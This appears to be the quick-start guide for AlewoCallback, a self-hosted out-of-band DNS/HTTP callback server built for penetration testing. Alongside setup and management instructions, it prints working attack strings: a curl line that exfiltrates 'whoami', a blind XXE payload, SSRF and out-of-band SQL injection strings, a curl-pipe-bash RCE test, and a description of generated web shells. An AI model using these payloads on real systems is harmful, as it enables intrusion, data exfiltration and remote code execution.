# AlewoCallback - Quick Start Guide

A modern callback service for Out-of-Band (OOB) vulnerability detection, similar to Burp Collaborator. Capture DNS queries and HTTP requests in real-time for detecting blind XXE, SSRF, SQL injection, and other vulnerabilities.

## 🚀 Installation (One Command)

```bash
sudo bash install.sh
```

The interactive installer will guide you through:
1. Domain configuration (or use default localhost/public IP)
2. SSL/HTTPS setup (optional, via Let's Encrypt)
3. Admin account creation
4. Dependency installation (Node.js, MongoDB, Nginx)
5. DNS and firewall configuration

**Installation time:** 5-10 minutes

## 🎯 Quick Access

After installation:

```bash
# Start the service
sudo bash start.sh

# Check status
bash status.sh

# Watch live status (updates every 5 seconds)
bash status.sh --watch

# Stop the service
bash stop.sh

# Force stop (kill immediately)
bash stop.sh --force
```

## 📡 DNS Configuration Required

For full DNS + HTTP monitoring, configure your domain DNS:

```
Type    Name              Value
────────────────────────────────────────
A       yourdomain.com    YOUR_SERVER_IP
A       *.yourdomain.com  YOUR_SERVER_IP
NS      yourdomain.com    ns1.yourdomain.com
A       ns1.yourdomain.com YOUR_SERVER_IP
```

**Test DNS is working:**
```bash
dig @YOUR_SERVER_IP test.yourdomain.com
nslookup test.yourdomain.com YOUR_SERVER_IP
```

## 🔐 First Login

1. Open your browser: `https://yourdomain.com` (or `http://localhost:3000`)
2. Login with credentials created during installation
3. **Note:** Registration is disabled - accounts only created during installation

## 💡 Basic Usage

### 1. Create a Subdomain

**Random subdomain:**
```bash
# In the dashboard, click "Generate Random"
# You'll get: abc123def.yourdomain.com (automatically expires in 10 minutes)
```

**Custom subdomain:**
```bash
# Click "Custom Subdomain"
# Enter subdomain name: mytest
# Set expiry time: 60 (minutes) - you can set between 1 and 10080 minutes (7 days)
# You'll get: mytest.yourdomain.com (expires in 60 minutes or your chosen time)
```

**Note:**
- Random subdomains always expire after 10 minutes
- Custom subdomains let you choose expiry time (1 minute to 7 days)
- All requests include automatic IP geolocation (country, region, city, coordinates)

### 2. Test DNS Detection

```bash
# Any DNS query will be captured
nslookup abc123def.yourdomain.com
dig abc123def.yourdomain.com
ping abc123def.yourdomain.com

# Check dashboard - you'll see the DNS query immediately!
```

### 3. Test HTTP Detection

```bash
# Any HTTP request will be captured
curl http://abc123def.yourdomain.com/test
curl -X POST http://abc123def.yourdomain.com/api -d '{"data":"test"}'
wget http://abc123def.yourdomain.com/payload

# Check dashboard - you'll see:
# - Full request headers
# - Query parameters
# - Request body
# - Source IP
# - User agent
```

### 4. Generate Testing Scripts

1. Select a subdomain
2. Choose template:
   - **Shell** (bash, sh): `curl http://abc123def.yourdomain.com/exfil?data=$(whoami)`
   - **Backdoor** (php, jsp, aspx): Web shells with callback
   - **CMD** (bat, ps1, py): Command execution scripts
   - **Web** (html, js, xml): XSS and XXE payloads
   - **SQL** (mssql, mysql, oracle): SQL injection callbacks
3. Choose file format
4. Click "Generate"
5. **Script URL:** `https://abc123def.yourdomain.com/script/randomname.ext`
6. **Auto-expires in 5 minutes**

### 5. View Interactions

**Combined timeline shows:**
- 🌐 HTTP requests (GET, POST, PUT, DELETE, etc.)
- 📡 DNS queries (A, AAAA, TXT, MX, CNAME, etc.)
- 🕒 Real-time updates via WebSocket
- 🌍 IP Geolocation (country, city, coordinates)
- 📊 Search and filter capabilities
- 💾 Export to JSON or CSV

**Click any interaction to see:**
- Full request/query details
- Headers, body, query params
- Source IP and geolocation (country, region, city)
- GPS coordinates (latitude, longitude)
- User agent and protocol
- Timestamp

## 🔧 Management Commands

### Start Service

```bash
sudo bash start.sh
```

**What it does:**
- Checks prerequisites (Node.js 18+, MongoDB)
- Verifies no existing instance running
- Starts HTTP server (port 3000 by default)
- Starts DNS server (port 53, requires sudo)
- Runs health checks
- Displays service status and access URLs

**Logs location:**
- Startup: `logs/startup.log`
- HTTP: `logs/http.log`
- Errors: `logs/error.log`

### Stop Service

```bash
bash stop.sh
```

**Graceful shutdown:**
- Sends SIGTERM to all processes
- Waits 10 seconds for graceful exit
- Force kills if still running
- Cleans up PID files
- Optionally stops MongoDB

**Force stop (immediate):**
```bash
bash stop.sh --force
```

### Check Status

```bash
bash status.sh
```

**Shows:**
- ✅ HTTP Server: Running (PID: 12345, Port: 3000)
- ✅ DNS Server: Running (Port: 53)
- ✅ MongoDB: Running (PID: 67890)
- Process uptime, memory, CPU usage
- Health check results
- Log file sizes
- Configuration (domain, SSL, environment)

**Live monitoring:**
```bash
bash status.sh --watch
```

Refreshes every 5 seconds. Press Ctrl+C to exit.

### View Logs

```bash
# HTTP requests log
tail -f logs/http.log

# Error log
tail -f logs/error.log

# Startup log
tail -f logs/startup.log
```

## 🎓 Real-World Examples

### Blind XXE Detection

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://abc123.yourdomain.com/xxe-test">
]>
<foo>&xxe;</foo>
```

Upload this XML to target application. If vulnerable, you'll see HTTP request in dashboard.

### SSRF Detection

```bash
# Test SSRF vulnerability
curl http://target.com/fetch?url=http://abc123.yourdomain.com/ssrf-test
```

If vulnerable, target server will make request to your subdomain.

### Blind SQL Injection (Out-of-Band)

```sql
-- MSSQL
'; exec master..xp_dirtree '\\abc123.yourdomain.com\test'; --

-- MySQL (requires LOAD_FILE)
' AND LOAD_FILE(CONCAT('\\\\\\\\',DATABASE(),'.abc123.yourdomain.com\\test')) --

-- Oracle
' || UTL_HTTP.REQUEST('http://abc123.yourdomain.com/sqli?data='||USER) ||'
```

DNS or HTTP request confirms vulnerability.

### Remote Code Execution Verification

```bash
# Generate shell script
# In dashboard: Generate → Shell → bash
# Copy URL: https://abc123.yourdomain.com/script/xyz789.sh

# Test RCE
curl http://target.com/exec?cmd=curl+https://abc123.yourdomain.com/script/xyz789.sh|bash
```

If RCE exists, you'll see:
1. Request to download script
2. Script execution callbacks

## 🔒 Security Features

- **Auto-expiring subdomains**: Random subdomains deleted after 10 minutes, custom subdomains deleted based on user-defined expiry (1 minute to 7 days)
- **Auto-expiring scripts**: Deleted after 5 minutes
- **IP Geolocation tracking**: Automatic location detection for all requests
- **No public registration**: Admin-only access
- **JWT authentication**: Secure token-based auth
- **HTTPS/SSL support**: Let's Encrypt integration
- **Input validation**: Sanitized inputs
- **Rate limiting**: Prevent abuse

## ⚙️ Configuration

Edit `.env` file:

```bash
# Server
PORT=3000
NODE_ENV=production

# Database
MONGODB_URI=mongodb://localhost:27017/alewo-callback

# JWT
JWT_SECRET=your-super-secret-jwt-key-change-this

# Domain
MAIN_DOMAIN=localhost
BASE_DOMAIN=callback.local

# DNS
DNS_PORT=53
SERVER_IP=127.0.0.1

# SSL (optional)
SSL_ENABLED=false
SSL_KEY_PATH=./ssl/privkey.pem
SSL_CERT_PATH=./ssl/fullchain.pem

# Cleanup
FILE_CLEANUP_TIME=5  # minutes
```

**Restart after changes:**
```bash
bash stop.sh && sudo bash start.sh
```

## 🐛 Troubleshooting

### DNS server won't start

**Error:** "DNS server requires root privileges"

**Solution:**
```bash
sudo bash start.sh
```

Port 53 requires root access.

### MongoDB not running

**Error:** "MongoDB not running"

**Solution:**
```bash
# Start MongoDB
sudo systemctl start mongod

# Or let start.sh auto-start it
sudo bash start.sh
```

### Port already in use

**Error:** "Port 3000 already in use"

**Solution:**
```bash
# Find process using port
lsof -i :3000

# Kill it or change PORT in .env
kill -9 <PID>
```

### Health check failed

**Error:** "HTTP server health check: FAILED"

**Solution:**
```bash
# Check logs
tail -n 50 logs/error.log

# Verify MongoDB is running
bash status.sh

# Restart service
bash stop.sh && sudo bash start.sh
```

### DNS queries not captured

**Check:**
1. DNS server running: `bash status.sh`
2. Port 53 open: `sudo lsof -i :53`
3. Firewall allows UDP 53: `sudo ufw allow 53/udp`
4. DNS records configured correctly
5. Test: `dig @YOUR_IP test.yourdomain.com`

### Subdomain expired

Subdomains auto-delete after 10 minutes. Create a new one:
```bash
# In dashboard: Generate Random or Custom Subdomain
```

## 📚 Additional Resources

- **Full documentation:** [README.md](README.md)
- **Installation guide:** [INSTALL.md](INSTALL.md)
- **Setup guide:** [SETUP_GUIDE.md](SETUP_GUIDE.md)
- **API documentation:** [README.md#api-endpoints](README.md)

## 💬 Support

For issues or questions:
1. Check `logs/error.log` for errors
2. Run `bash status.sh` to check service status
3. Review this quick start guide
4. Check full documentation

## 🎉 You're Ready!

1. ✅ Service installed and running
2. ✅ DNS + HTTP monitoring active
3. ✅ Subdomains created and monitored
4. ✅ Real-time interaction tracking
5. ✅ Script generation working

**Happy bug hunting! 🐛🔍**

---

**Quick Command Reference:**

```bash
# Start
sudo bash start.sh

# Status
bash status.sh
bash status.sh --watch

# Stop
bash stop.sh
bash stop.sh --force

# Logs
tail -f logs/http.log
tail -f logs/error.log

# Uninstall
bash uninstall.sh
```
